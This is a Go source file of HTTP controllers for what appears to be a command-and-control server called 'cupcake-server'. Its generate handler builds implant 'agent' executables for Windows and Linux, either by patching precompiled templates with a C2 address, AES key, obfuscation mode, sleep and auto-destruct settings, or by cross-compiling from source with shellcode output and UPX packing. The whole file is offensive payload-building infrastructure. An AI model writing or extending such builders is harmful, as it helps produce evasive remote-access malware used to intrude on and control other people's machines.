package controllers

import (
	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/hub"
	"cupcake-server/services"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
)

var upgrader_gen = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

func HandleGenerate(c *gin.Context) {
	var req struct {
		OS              string `json:"os"`
		Arch            string `json:"arch"`
		ListenerID      string `json:"listener_id"`
		Host            string `json:"host"`
		Method          string `json:"method"`
		AsShellcode     bool   `json:"as_shellcode"`
		AutoDestruct    bool   `json:"auto_destruct"`
		SleepTime       int    `json:"sleep_time"`
		AesKey          string `json:"aes_key"`
		UseUPX          bool   `json:"use_upx"`
		EncryptionSalt  string `json:"encryption_salt"`
		ObfuscationMode string `json:"obfuscation_mode"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": "Invalid input"})
		return
	}

	// 1. Fetch Listener Details
	val, ok := globals.Listeners.Load(req.ListenerID)
	if !ok {
		c.JSON(404, gin.H{"error": "监听器未在线或不存在"})
		return
	}
	ln := val.(*globals.Listener)

	req.EncryptionSalt = ln.EncryptionSalt
	req.ObfuscationMode = ln.ObfuscateMode
	req.AesKey = ln.EncryptKey

	// --- [NEW] Method Dispatcher ---
	
	// Mode A: Binary Patch (Synchronous, fast)
	if req.Method == "patch" {
		// Prepare template name based on protocol and OS
		templateName := "client_template_linux"
		if req.OS == "windows" {
			switch strings.ToUpper(ln.Protocol) {
			case "WS":
				templateName = "client_template_windows.exe"
			case "TCP":
				templateName = "client_template_windows_tcp.exe"
			case "DNS":
				templateName = "client_template_windows_dns.exe"
			default:
				templateName = "client_template_windows.exe"
			}
		} else if req.OS == "linux" {
			switch strings.ToUpper(ln.Protocol) {
			case "WS":
				templateName = "client_template_linux"
			case "TCP":
				templateName = "client_template_linux_tcp"
			case "DNS":
				templateName = "client_template_linux_dns"
			default:
				templateName = "client_template_linux"
			}
			if req.Arch == "arm64" {
				templateName = "client_template_linux_arm64"
			}
		}
		
		templatePath := filepath.Join("assets", templateName)
		raw, err := os.ReadFile(templatePath)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "未找到预编译模板 (" + templateName + ")，请确保已编译模板或切换到源码模式"})
			return
		}

		// Prepare C2 URL with correct scheme
		c2url := ""
		host := req.Host
		if host == "" {
			host = "127.0.0.1"
		}

		switch strings.ToUpper(ln.Protocol) {
		case "WS":
			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
		case "TCP":
			c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
		case "DNS":
			c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
		default:
			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
		}

		patched, err := services.PatchPayload(raw, c2url, req.AesKey, 10, "", req.AutoDestruct, req.SleepTime, req.EncryptionSalt, req.ObfuscationMode)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "补丁失败: " + err.Error()})
			return
		}

		filename := fmt.Sprintf("agent_%s_%s", req.Arch, uuid.New().String()[:8])
		if req.OS == "windows" {
			filename += ".exe"
		}
		
		c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filename))
		c.Data(http.StatusOK, "application/octet-stream", patched)
		return
	}

	// Mode B: Source Build (Asynchronous, supports cross-compilation/custom features)
	taskID := uuid.New().String()

	conf := services.PayloadConfig{
		OSType:            req.OS,
		Arch:              req.Arch,
		Protocol:          ln.Protocol,
		Host:              req.Host,
		Port:              fmt.Sprintf("%d", ln.Port),
		AESKey:            req.AesKey,
		AsShellcode:       req.AsShellcode,
		AutoDestruct:      req.AutoDestruct,
		SleepTime:         req.SleepTime,
		UseUPX:            req.UseUPX,
		HeartbeatInterval: 30,
		EncryptionSalt:    req.EncryptionSalt,
		ObfuscationMode:   req.ObfuscationMode,
	}

	go func() {
		logChan := make(chan string, 100)
		go func() {
			for line := range logChan {
				hub.BuildHub.Broadcast(taskID, hub.WsPacket{
					MsgType: "log",
					Content: line,
					TaskID:  taskID,
				})
			}
		}()

		artifactPath, err := services.BuildAgentWithLogger(conf, logChan)
		if err != nil {
			hub.BuildHub.Broadcast(taskID, hub.WsPacket{
				MsgType: "error",
				Content: err.Error(),
				TaskID:  taskID,
			})
		} else {
			filename := filepath.Base(artifactPath)
			downloadURL := "/api/downloads/" + filename
			hub.BuildHub.Broadcast(taskID, hub.WsPacket{
				MsgType: "success",
				Content: downloadURL,
				TaskID:  taskID,
			})
		}
		close(logChan)
	}()

	c.JSON(http.StatusOK, gin.H{
		"status":  "success",
		"task_id": taskID,
		"msg":     "构建任务已启动",
	})
}

func HandleGenerateStream(c *gin.Context) {
	c.JSON(400, gin.H{"error": "Please use POST /api/generate"})
}

func HandleBuildLogsWS(c *gin.Context) {
	taskID := c.Param("task_id")
	ws, err := upgrader_gen.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		return
	}
	defer ws.Close()

	logChan := hub.BuildHub.Subscribe(taskID)
	defer hub.BuildHub.Unsubscribe(taskID, logChan)

	for packet := range logChan {
		if err := ws.WriteJSON(packet); err != nil {
			break
		}
	}
}

func HandleFsDownload(c *gin.Context) {
	uuid := c.Query("uuid")
	path := c.Query("path")
	c.JSON(200, gin.H{"uuid": uuid, "path": path})
}
